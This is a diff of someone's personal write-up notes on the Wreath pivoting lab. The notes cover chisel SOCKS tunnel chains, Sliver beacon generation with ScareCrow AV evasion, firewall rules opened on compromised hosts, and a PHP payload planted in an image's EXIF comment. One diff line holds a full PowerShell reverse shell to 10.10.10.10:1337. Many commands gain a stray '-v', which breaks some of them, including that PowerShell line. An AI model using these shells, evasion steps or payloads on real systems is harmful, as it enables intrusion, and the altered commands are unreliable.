@@ -4,7 +4,7 @@
 
 Name: Wreath
 Date:  
-Difficulty:  
+Difficulty:  Easy
 Goals:  
 - Solidify Pivoting skills
 - PWK HERE WE GO!
@@ -23,6 +23,7 @@ dos2unix $file
 - CentOS has a restrictive firewall
 - more chisel and where I was going wrong! 
 - Why C2 have there own portfwd and pivoting 
+- even more chisel - no -socks5 and -reverse at the same time one server for each
 Beyond Root:
 - Do the report like a professional
 - Prep reporting for further Offsec certs 2023!
@@ -32,8 +33,6 @@ Beyond Root:
 - [[Wreath-Notes.md]]
 - [[Wreath-CMD-by-CMDs.md]]
 - [[Wreath-Penetration-Test-Report]]
-
-![](Wreath-map.excalidraw.md)
 
 ## Introduction
 
@@ -274,17 +273,17 @@ What command would you use to start a chisel server for a reverse connection on 
 What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?
 
 ```
-./chisel client 172.16.0.200R:4242:socks
+./chisel client -v 172.16.0.200R:4242:socks
 ```
 
 How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.  
 ```
-./chisel client 172.16.0.200:1337  R:33060 :172.16.0.100:3306 & 
+./chisel client -v 172.16.0.200:1337  R:33060 :172.16.0.100:3306 & 
 ```
 
 If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?
 ```
-./chisel client 172.16.0.5:4444 8000:172.16.0.10:80
+./chisel client -v 172.16.0.5:4444 8000:172.16.0.10:80
 ```
 #### Task 15 Pivoting sshuttle
 
@@ -314,7 +313,7 @@ curl http://10.50.85.217/SILVER -o systemCtl
 
 
 sudo ./chisel server -hosts 10.50.85.217 --reverse -socks 10000
-nohup ./chisel client 10.50.85.217:10000 R:10001:socks &
+nohup ./chisel client -v 10.50.85.217:10000 R:10001:socks &
 # modify /etc/proxychains4.conf socks5 127.0.0.1 10001
 ```
 
@@ -564,7 +563,7 @@ Given the simple solution of just Scarecrowing-non-shitnowge-tme-avnoevado Silve
 I also need to relay back to my Silver Server and another listener for the safety line of multiple shells.
 
 ```powershell
-$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+$client -v = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
 He then base64, lttle endians it: convert it to UTF-16LE, which the Windows Default encoding, encodes it to base64 then removes the newline .
@@ -632,7 +631,7 @@ Much like my `nohup $cmd &` trick need a trick for background processes while ne
 
 Backgrounding in PowerShell - [the wonders of Start-Job](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/start-job?view=powershell-7.3)
 ```powershell
-start-job { .\chisel.exe client 10.200.96.150:10007 R:10007:127.0.0.10008:socks }
+start-job { .\chisel.exe client -v 10.200.96.150:10007 R:10007:127.0.0.10008:socks }
 # Control the job with a identification number 
 start-job -id $int32
 stop-job -id $int32
@@ -671,7 +670,7 @@ pivots
 // Start a tcp pivots on the current session
 // default listener is on 9898
 pivots tcp 
-pivots tcp  --bind 0.0.0.0
+pivots tcp --bind 0.0.0.0
 // Generate an implant that will connect to the pivot listener
 generate --tcp-pivot 192.168.1.1:9898
 ```
@@ -691,7 +690,7 @@ Sadly no pivoting
 
 Created this
 ```bash
-generate beacon --tcp-pivot  10.200.57.200:9898 --arch amd64 --os windows --save /home/kali/Wreath/GIT-SERV-S-Pivot.bin -f shellcode -G
+generate beacon --tcp-pivot  10.200.84.200:9898 --arch amd64 --os windows --save /home/kali/Wreath/GIT-SERV-S-Pivot.bin -f shellcode -G
 /opt/ScareCrow/ScareCrow -I /home/kali/Wreath/GIT-SERV-S-Pivot.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
 ```
@@ -702,7 +701,7 @@ Nevermind I tried atleast I will look into why further and I am sure there is a 
 
 ```bash
 # Prod
-nohup ./chisel client 10.50.55.42:10000 10004:10.200.57.200:10004:socks &
+nohup ./chisel client -v 10.50.85.217:10000 10004:10.200.84.200:10004:socks &
 firewall-cmd --zone=public --add-port 10004/tcp
 ```
 
@@ -711,70 +710,335 @@ firewall-cmd --zone=public --add-port 10004/tcp
 netsh advfirewall firewall add rule name="nvm-chisel-04" dir=in action=allow protocol=tcp localport=10004
 netsh advfirewall firewall add rule name="nvm-chisel-04" dir=out action=allow protocol=tcp localport=10004
 
-start-job { .\chisel.exe client 10.200.57.200:10004 10004:socks  }
+start-job { .\chisel.exe client -v 10.200.84.200:10004 10004:socks  }
 ```
 
 ## Chisel Confusions
 
-Multiple article bamboozed me and I must have failed to add this, because some how the final box is externally facing and I must not reread that I missed one thing and that one thing was this: https://ap3x.github.io/posts/pivoting-with-chisel/ https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=5445s
+Multiple article bamboozled me and I must have failed to add this, because some how the final box is externally facing and I must not reread that I missed one thing and that one thing was this: https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=5445s
+- [Ap3x article](https://ap3x.github.io/posts/pivoting-with-chisel/ ) does not chain chisel client -v to servers its
+	- kali server chisel <- web chisel client
+	- web chisel server <- DC chisel client
+	- etc..
+	- Add entries into proxychains is good but not robust as I need to RDP and evil winrm into Git ...
+- [0xdf](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html):
+![](writtenversion0xdfplusippsectorescue.png)
+
+ 
 ```bash
 # Kali
 server -p 10000
-client 127.0.0.1:10004 socks
+client -v 127.0.0.1:10004 socks
 # Prod
-client kali:10000 R:10004:127.0.0.1:11000
+client -v kali:10000 R:10004:127.0.0.1:11000
 server -p 10000 --socks5
 ```
 Basically tmux pane pains. This becomes:
 
 ```bash
 # Kali
-client 127.0.0.1:10011 socks
+./chisel server -host 10.50.85.217 --reverse --socks5 -p 10000 --auth 
+
+client -v 127.0.0.1:10011 socks
+
+echo "socks5 127.0.0.1 10001" | sudo tee -a /etc/proxychains4.conf
+# echo "socks5 127.0.0.1 10002" | sudo tee -a /etc/proxychains4.conf
+# sed -i 's/socks5 127.0.0.1 10002/# socks5 127.0.0.1 10002/g' /etc/proxychains4.conf
+
 # Prod
-firewall-cmd --zone=public --add-port 11000/tcp
-nohup ./chisel client 10.50.55.42:10000 R:10004:127.0.0.1:11000 &
-nohup ./chisel server -host 10.200.57.200 -p 11000 --reverse  &
+nohup ./chisel client -v 10.50.85.217:10000 R:10001:socks &
+nohup ./chisel client -v 10.50.85.217:10000 R:127.0.0.1:10002:10.200.84.150:80 &
+## Prod Second shell
+./chisel server -host 10.200.84.200 -p 11000 --reverse --sock5
+# Git
+## RDP
+netsh advfirewall firewall add rule name="nvm-chisel-clientin" dir=in action=allow protocol=tcp localport=11001
+netsh advfirewall firewall add rule name="nvm-chisel-clientout" dir=out action=allow protocol=tcp localport=11001
+netsh advfirewall firewall add rule name="nvm-chisel-serverin" dir=in action=allow protocol=tcp remoteport=11000
+netsh advfirewall firewall add rule name="nvm-chisel-serverout" dir=out action=allow protocol=tcp remoteport=11000
+netsh advfirewall firewall add rule name="nvm-chisel-PC-clientin" dir=in action=allow protocol=tcp localport=12002
+netsh advfirewall firewall add rule name="nvm-chisel-PC-clientout" dir=out action=allow protocol=tcp localport=12002
+netsh advfirewall firewall add rule name="nvm-chisel-PC-serverin" dir=in action=allow protocol=tcp remoteport=12000
+netsh advfirewall firewall add rule name="nvm-chisel-PC-serverout" dir=out action=allow protocol=tcp remoteport=12000
+
+start-job { chisel.exe client -v 10.200.84.200:11000 R:11001:socks }
+
+
+nohup ./chisel client -v 10.50.85.217:10000 R:10004:127.0.0.1:11000 &
+
+
 ```
 
 ```bash
 # Kali <-> Box 1 <-> Box 2 <-> Box 3 
 # Server
-# Client Reverse -> Remote Server
+# Client R:PORT:socks -> Remote Server
 # Client Sock -> Local Server
 
 
-
 # Kali
-./chisel server -host 10.50.55.42 --reverse --socks5 -p 10000 
-./chisel client 127.0.0.1:10011 socks # $Kaliclient_pivot_toBox2
-./chisel client 127.0.0.1:10012 socks # $Kaliclient_pivot_toBox3
-# Box 1 <-> Kali
-nohup ./chisel client 10.50.55.42:10000 10001:socks
+./chisel server -host 10.50.85.217 --reverse --socks5 -p 10000 
+# Reverse proxys -> server on Box1
+./chisel client -v 10.200.84.200:11000 :socks # $Kaliclient_pivot_toBox2
+./chisel client -v 10.200.84.200:11000 R:12001:socks # $Kaliclient_pivot_toBox3
 
 
-# Box 1 server for pivoting from Box 2
-./chisel server -host 10.200.57.200 --reverse --socks5 -p 11000
-# Connect back to the server on kali through $Kaliclient on 127.0.0.1:10011
-nohup ./chisel client 10.50.55.42:10000 R:10011:127.0.0.1:11000 &
+chisel client <.200-machine-ip>:<chisel-server-port> <local-port>:<.150-machine-ip>:<remote-port>
 
-# Box 2 -> Box 1 -> Kali
-# Box 1
-nohup ./chisel client 127.0.0.1:11012 socks & # $Box1client
-nohup ./chisel client 10.50.55.42:10000 R:10011:127.0.0.1:11011 & # $Kaliclient_pivottoBox3
+
+# Box1 <-> Kali
+## Box1 server for pivoting from Box 2 - second shell
+./chisel server -host 10.200.84.200 --reverse --socks5 -p 11000
+nohup ./chisel client -v 10.50.85.217:10000 10001:socks
+
+
+# Box2
+# 
+.\chisel.exe server -host 10.200.84.150 --reverse --socks5 -p 12000 
+# Reverse tunnel 
+
+.\chisel.exe client 10.200.84.200:11000 R:10.200.84.100:12001:10.200.84.100:80
+
+start-job { C:\users\nvm\Documents\chisel.exe client 10.200.84.200:11000 R:11001:socks }
+
+
+
+# Connect back to the server on kali through $Kaliclient -v on 127.0.0.1:10011
+nohup ./chisel client -v 10.50.85.217:10000 R:10011:127.0.0.1:11000 &
+
+# Box2 -> Box 1 -> Kali
+# Box1
+nohup ./chisel client -v 127.0.0.1:11012 socks & # $Box1client
+nohup ./chisel client -v 10.50.85.217:10000 R:10011:127.0.0.1:11011 & # $Kaliclient_pivottoBox3
 # Box 2
-./chisel server -host 10.200.57.150 --reverse --socks5 -p 12000 
-# Connect back to the server on Box 1 through $Box1client on 127.0.0.1:11012
-nohup ./chisel client 10.200.57.200:11000 R:11012:127.0.0.1:12000 &
-# Box 3 10.200.57.100 
-# shell 10.200.57.150 1200?
+./chisel server -host 10.200.84.150 --reverse --socks5 -p 12000 
+# Connect back to the server on Box 1 through $Box1client -v on 127.0.0.1:11012
+nohup ./chisel client -v 10.200.84.200:11000 R:11012:127.0.0.1:12000 &
+# Box 3 10.200.84.100 
+# shell 10.200.84.150 1200?
 
+```
+
+Finally
+![](chiselmyhallsinspoonstoglueYA.png)
+
+And then I checked and ask phind whether you can actually use both `-sock5` and `-reverse` flags in the same server. Nope. 
+![](forwardsocksproxy.png)
+
+
+
+Unfortunately  `socat` with sliver does not work :(
+```bash
+#### GIT -> SOCAT -> Sliver
+generate beacon --http 10.200.84.200:11002 --arch amd64 --os windows --save /home/kali/Wreath/GIT-SERV-S.bin -f shellcode -G
+/opt/ScareCrow/ScareCrow -I /home/kali/Wreath/GIT-SERV-S.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
+GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
+
+# Socat Relay for Sliver till I learn to pivot like an APT from 2010
+nohup ./socat tcp-l:11002 tcp:10.50.85.217:11002 &
+
+netsh advfirewall firewall add rule name="nvm-chisel-clientin" dir=in action=allow protocol=tcp localport=11002
+netsh advfirewall firewall add rule name="nvm-chisel-clientout" dir=out action=allow protocol=tcp localport=11002
+```
+
+After 3 hours of this again including wrestling with Phind to try to get that bit further I need closure on Wreath.
+
+Socks client only works when it is client mode. Ippsec chisel within a chisel.
+```bash
+kali:> chisel server -p 10000 -reverse
+
+box1:> chisel client kali:10000 R:10001:127.0.0.1:11000
+box1:> chisel server -host box1:11000 --socks5
+
+curl 127.0.0.1:10001 # -> to box1-chisel-client -> box1-chisel-server
+kali:> chisel client 127.0.0.1:10001 socks
+```
+
+Maybe I missed idea on a chisel within a chisel
+
+```
+kali:> chisel server -p 12000 --reverse
+
+box1:> chisel client kali:10000 R:10001:127.0.0.1:11000
+box1:> chisel server -host box1:11000 --socks5
+
+curl 127.0.0.1:10001 # -> to box1-chisel-client -> box1-chisel-server
+kali:> chisel client 127.0.0.1:10001 socks
+```
+
+#### THE DEFAULT IS 127.0.0.1:1080
+```bash
+# MAKE IT BIND TO A PORT
+./chisel client -v 127.0.0.1:10001 10002:socks
+```
+
+The lack of `-host` flag and my brain wanting to check the chisel -v output
+## BREAKING THROUGH WITH ENOUGH CHISELS TO BLOCK OUT THE SUN AND MOON
+
+
+Kali
+```bash
+./chisel server -v --host 10.50.85.217 --reverse -p 10000
+# Kali -> box1 socks - socks client 
+./chisel client -v 127.0.0.1:10010 10011:socks
+# 
+./chisel client -v 127.0.0.1:10020 10021:socks
+
+```
+
+Box 1
+```bash
+#
+./chisel server -v --host 10.200.84.200 --socks5 -p 11000
+# Kali -> box1 socks - reverse client 
+nohup ./chisel client 10.50.85.217:10000 R:10010:10.200.84.200:11000 & 
+
+# Kali -> box1  - box2 socks
+nohup ./chisel client 10.50.85.217:10000 R:10020:127.0.0.1:10.200.84.150:12001 &
+```
+
+Box 2
+```powershell
+.\chisel.exe -v server --host 10.200.84.150 -p 12000 --socks5
+
+.\chisel.exe client -v 10.200.84.200:10021 R:10021:127.0.0.1:12000
+```
+
+This is where I was at
+![1080](pivotingwithchiselhardcore.excalidraw)
+
+![](firstc2pivotinmylifeVERYHAPPY.png)
+
+![](thanksjustinoark.png)
+
+And thanks again to [Justin's Article](https://redsiege.com/blog/2022/11/introduction-to-sliver/) 
+![](sliverbeatingthechisel.png)
+
+He is now a senior consultant awesome!
+![](welldeservedsenior.png)
+
+
+And finally!
+![](FINALLY.png) 
+
+
+Using the Wappalyzer browser extension ([Firefox](https://addons.mozilla.org/en-GB/firefox/addon/wappalyzer/) | [Chrome](https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg?hl=en)) or an alternative method, identify the server-side Programming language (including the version number) used on the website.
+```
+php 7.4.11
 ```
 
 #### Task 35 Personal PC The Wonders of Git
 
+First question is to find the website
+```powershell
+get-childitem -path C:\gitstack -include Website.git -recurse -ErrorAction SilentlyContinue
+```
+
+Use your WinRM access to look around the Git Server. What is the absolute path to the `Website.git` directory?
+```
+C:\gitstack\repositories\Website.git
+```
+
+I used the `sliver` `tcp-pivot` session to download this, but I had use RDP to compress the directory as `compress-archive` does not include `.DIR`
+```
+mv .git
+```
+
+```bash
+git clone https://github.com/internetwache/GitTools
+```
+
+
+```bash
+/opt/GitTools/Extractor/extractor.sh . ~/Wreath/extractor-Website-git
+separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"
+```
+![](commits.png)
 #### Task 36 Personal PC Website Code Analysis
 
+
+```bash
+find . -name "*.php"
+```
+![](neighboorhoodwatch.png)
+
+
+
+What does Thomas have to phone Mrs Walker about?
+```
+neighbourhood watch meetings
+```
+
+Aside from the filter, what protection method is likely to be in place to prevent people from accessing this page?
+```
+basic auth
+```
+
+```php
+<?php
+
+if (isset($_POST["upload"]) && is_uploaded_file($_FILES["file"]["tmp_name"])) {
+    $target = "uploads/" . basename($_FILES["file"]["name"]);
+    $goodExts = ["jpg", "jpeg", "png", "gif"];
+    if (file_exists($target)) {
+        header("location: ./?msg=Exists");
+        die();
+    }
+    $size = getimagesize($_FILES["file"]["tmp_name"]);
+    if (
+        !in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) ||
+        !$size
+    ) {
+        header("location: ./?msg=Fail");
+        die();
+    }
+    move_uploaded_file($_FILES["file"]["tmp_name"], $target);
+    header("location: ./?msg=Success");
+    die();
+} elseif ($_SERVER["REQUEST_METHOD"] == "post") {
+    header("location: ./?msg=Method");
+}
+
+if (isset($_GET["msg"])) {
+    $msg = $_GET["msg"];
+    switch ($msg) {
+        case "Success":
+            $res = "File uploaded successfully!";
+            break;
+        case "Fail":
+            $res = "Invalid File Type";
+            break;
+        case "Exists":
+            $res = "File already exists";
+            break;
+        case "Method":
+            $res = "No file send";
+            break;
+    }
+}
+?>
+
+```
+
+Which extensions are accepted (comma separated, no spaces or quotes)?
+```
+jpg,jpeg,png,gif
+```
 #### Task 37 Personal PC Exploit PoC
+
+![](iloveruby.png)
+
+![](iloverubyandtwreath.png)
+
+
+
+```bash
+cp /home/kali/.sliver/go/src/image/testdata/video-001.jpeg test-NVM.jpeg.php
+
+exiftool -Comment="<?php echo \"Test Payload\"; die(); ?>" test-NVM.jpeg.php
+```
+
+![](wat.png)
 
 ## AV Evasion Notes for the Archive and answers for the Write-up
 
@@ -868,7 +1132,9 @@ Password
 
 
 ![](tomeyes.png)
+#### More pivoting techniques
 
+https://cheatsheet.haax.fr/network/pivot_techniques/
 #### Socat proxy
 
 ```bash
@@ -888,6 +1154,12 @@ start-job { $command }
 
 
 #### Sliver
+
+[Alh4zr3d uses Sliver for this video](https://www.youtube.com/watch?v=4ZQgGZ5q1wQ) - hopeful showcase pivoting
+- https://github.com/BishopFox/sliver/wiki/Pivots
+- https://redsiege.com/blog/2022/11/introduction-to-sliver/
+- https://tishina.in/opsec/sliver-opsec-notes
+- https://dominicbreuker.com/post/learning_sliver_c2_08_implant_basics/
 
 Although not successful in someways I learnt alot
 Sliver [Pivots](https://github.com/BishopFox/sliver/wiki/Pivots) != [Port-Forwarding](https://github.com/BishopFox/sliver/wiki/Port-Forwarding); Pivots are for C2 traffic, `portfwd` is *for tunneling generic tcp connections into a target environment.*
@@ -913,4 +1185,11 @@ portfwd add --remote 10.10.10.10:22
 // Reverse Port forward
 rportfwd add --remote 10.10.10.10:22
 // `wg-portfwd` WireGuard Port Foward requires WireGuard 
+```
+
+#### Remake
+
+```bash
+/opt/GitTools/Extractor/extractor.sh . ~/Wreath/extractor-Website-git
+separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"
 ```
